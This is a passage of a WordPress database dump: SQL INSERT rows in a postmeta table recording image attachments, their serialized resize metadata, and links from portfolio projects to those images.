INSERT INTO `cmrfu_postmeta` VALUES("1703","850","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:533;s:4:\"file\";s:14:\"2013/10/11.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"11-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"11-300x199.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:199;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"11-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"11-450x533.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:533;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"11-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"11-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1704","851","_wp_attached_file","2013/10/51.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1705","851","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:533;s:4:\"file\";s:14:\"2013/10/51.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"51-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"51-300x199.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:199;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"51-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"51-450x533.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:533;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"51-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"51-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1706","852","_wp_attached_file","2013/10/61.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1707","852","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:533;s:4:\"file\";s:14:\"2013/10/61.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"61-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"61-300x199.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:199;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"61-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"61-450x533.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:533;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"61-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"61-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1708","853","_wp_attached_file","2013/10/101.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1709","853","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:533;s:4:\"file\";s:15:\"2013/10/101.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:15:\"101-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:15:\"101-300x199.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:199;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:15:\"101-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:15:\"101-450x533.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:533;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:15:\"101-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:13:\"101-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1710","182","er_leaf_project_images","850");
INSERT INTO `cmrfu_postmeta` VALUES("1711","182","er_leaf_project_images","851");
INSERT INTO `cmrfu_postmeta` VALUES("1712","182","er_leaf_project_images","852");
INSERT INTO `cmrfu_postmeta` VALUES("1713","182","er_leaf_project_images","853");
INSERT INTO `cmrfu_postmeta` VALUES("1714","182","_wp_old_slug","blue-tower");
INSERT INTO `cmrfu_postmeta` VALUES("1715","177","_edit_lock","1401704173:1");
INSERT INTO `cmrfu_postmeta` VALUES("1718","856","_wp_attached_file","2013/10/12.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1719","856","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/12.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"12-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"12-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"12-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"12-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"12-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"12-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1720","857","_wp_attached_file","2013/10/21.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1721","857","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/21.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"21-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"21-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"21-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"21-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"21-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"21-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1722","858","_wp_attached_file","2013/10/62.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1723","858","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/62.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"62-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"62-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"62-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"62-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"62-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"62-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1724","859","_wp_attached_file","2013/10/121.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1725","859","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:15:\"2013/10/121.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:15:\"121-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:15:\"121-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:15:\"121-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:15:\"121-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:15:\"121-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:13:\"121-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1726","177","er_leaf_project_images","856");
INSERT INTO `cmrfu_postmeta` VALUES("1727","177","er_leaf_project_images","857");
INSERT INTO `cmrfu_postmeta` VALUES("1728","177","er_leaf_project_images","858");
INSERT INTO `cmrfu_postmeta` VALUES("1729","177","er_leaf_project_images","859");
INSERT INTO `cmrfu_postmeta` VALUES("1730","177","_wp_old_slug","vancee-hometown");
INSERT INTO `cmrfu_postmeta` VALUES("1734","862","_wp_attached_file","2013/10/New_22.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1735","862","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:18:\"2013/10/New_22.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:18:\"New_22-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:18:\"New_22-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:18:\"New_22-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:18:\"New_22-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:18:\"New_22-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:16:\"New_22-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1736","863","_wp_attached_file","2013/10/New_41.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1737","863","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:18:\"2013/10/New_41.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:18:\"New_41-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:18:\"New_41-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:18:\"New_41-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:18:\"New_41-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:18:\"New_41-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:16:\"New_41-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1738","864","_wp_attached_file","2013/10/New_51.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1739","864","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:18:\"2013/10/New_51.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:18:\"New_51-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:18:\"New_51-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:18:\"New_51-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:18:\"New_51-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:18:\"New_51-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:16:\"New_51-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1740","865","_wp_attached_file","2013/10/New_61.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1741","865","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:18:\"2013/10/New_61.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:18:\"New_61-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:18:\"New_61-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:18:\"New_61-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:18:\"New_61-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:18:\"New_61-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:16:\"New_61-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1742","173","er_leaf_project_images","862");
INSERT INTO `cmrfu_postmeta` VALUES("1743","173","er_leaf_project_images","863");
INSERT INTO `cmrfu_postmeta` VALUES("1744","173","er_leaf_project_images","864");
INSERT INTO `cmrfu_postmeta` VALUES("1745","173","er_leaf_project_images","865");
INSERT INTO `cmrfu_postmeta` VALUES("1746","173","_wp_old_slug","chensee-home");
INSERT INTO `cmrfu_postmeta` VALUES("1747","168","_edit_lock","1401705519:1");
INSERT INTO `cmrfu_postmeta` VALUES("1748","166","_edit_lock","1401704727:1");
INSERT INTO `cmrfu_postmeta` VALUES("1749","867","_wp_attached_file","2013/10/13.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1750","867","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/13.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"13-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"13-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"13-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"13-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"13-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"13-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1753","870","_wp_attached_file","2013/10/31.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1754","870","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/31.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"31-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"31-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"31-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"31-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"31-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"31-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1755","871","_wp_attached_file","2013/10/63.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("1756","871","_wp_attachment_metadata","a:5:{s:5:\"width\";i:800;s:6:\"height\";i:600;s:4:\"file\";s:14:\"2013/10/63.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"63-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"63-300x225.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:225;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"63-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"63-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"63-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"63-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:10:{s:8:\"aperture\";i:0;s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";i:0;s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";i:0;s:3:\"iso\";i:0;s:13:\"shutter_speed\";i:0;s:5:\"title\";s:0:\"\";}}");
INSERT INTO `cmrfu_postmeta` VALUES("1757","872","_wp_attached_file","2013/10/82.jpg");
